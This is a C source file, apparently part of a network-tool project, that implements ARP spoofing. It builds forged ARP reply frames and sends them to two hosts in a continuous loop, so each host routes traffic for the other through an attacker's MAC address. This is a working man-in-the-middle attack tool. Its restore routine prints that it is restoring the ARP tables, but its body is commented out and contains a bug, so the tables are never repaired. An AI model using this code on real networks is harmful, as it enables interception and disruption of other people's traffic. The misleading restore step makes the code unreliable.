#include <unistd.h>
#include "spoofer.h"

static char* get_arp_frame(
	unsigned char destination_ip[4], unsigned char source_ip[4],
	unsigned char destination_mac[6], unsigned char source_mac[6])
{
	unsigned char* packet = malloc(42);
	if (!packet) return NULL;

	// Destination and source MAC-Addresses
	memcpy(packet, destination_mac, 6);
	memcpy(packet + 6, source_mac, 6);

	// EtherType (ARP)
	packet[12] = 0x08;
	packet[13] = 0x06;

	// Payload
	{
		// Hardware type (Ethernet)
		packet[14] = 0x00;
		packet[15] = 0x01;
	
		// Protocol type (IPv4)
		packet[16] = 0x08;
		packet[17] = 0x00;
	
		// Hardware address length
		packet[18] = 0x06;

		// Protocol address length
		packet[19] = 0x04;
	
		// Opcode: ARP reply
		packet[20] = 0x00;
		packet[21] = 0x02;

		// Sender MAC address
		memcpy(packet + 22, source_mac, 6);

		// Sender IP address
		memcpy(packet + 28, source_ip, 4);

		// Target MAC address
		memcpy(packet + 32, destination_mac, 6);

		// Target IP address
		memcpy(packet + 38, destination_ip, 4);
	}

	return packet;
}

static void poison(state* s, pcap_t* pcap)
{
	unsigned char* packet;

	// SOURCE->TARGET => SOURCE->INQUISITOR
	packet = get_arp_frame(s->source_ip, s->target_ip, s->source_mac, s->inquisitor_mac);
	pcap_sendpacket(pcap, packet, 42);
	free(packet);
	
	// TARGET->SOURCE => TARGET->INQUISITOR
	packet = get_arp_frame(s->target_ip, s->source_ip, s->target_mac, s->inquisitor_mac);
	pcap_sendpacket(pcap, packet, 42);
	free(packet);
}

static void restore(state* s)
{
	printf("Restoring ARP tables...\n");

	// for (int i = 0; i < 10; ++i) {
	// 	// SOURCE->TARGET => SOURCE->INQUISITOR
	// 	packet = get_arp_frame(s->source_ip, s->target_ip, s->source_mac, s->target_mac);
	// 	pcap_sendpacket(pcap, packet, 42);
	// 	free(packet);
		
	// 	// TARGET->SOURCE => TARGET->INQUISITOR
	// 	packet = get_arp_frame(s->target_ip, s->source_ip, s->target_mac, s->source_ip);
	// 	pcap_sendpacket(pcap, packet, 42);
	// 	free(packet);
	
	// 	usleep(500);
	// }
}

void* spoof(void* arg)
{
	state* s = ((spoofer_t*)arg)->state;
	pcap_t* pcap = ((spoofer_t*)arg)->pcap;

	while (get_status(&s->mutex, &s->status) == KEEP_GOING) {
		poison(s, pcap);
		usleep(200);
	}

	while (get_status(&s->mutex, &s->status) != RESTORE)
		usleep(100);
	
	restore(s);
	return NULL;
}
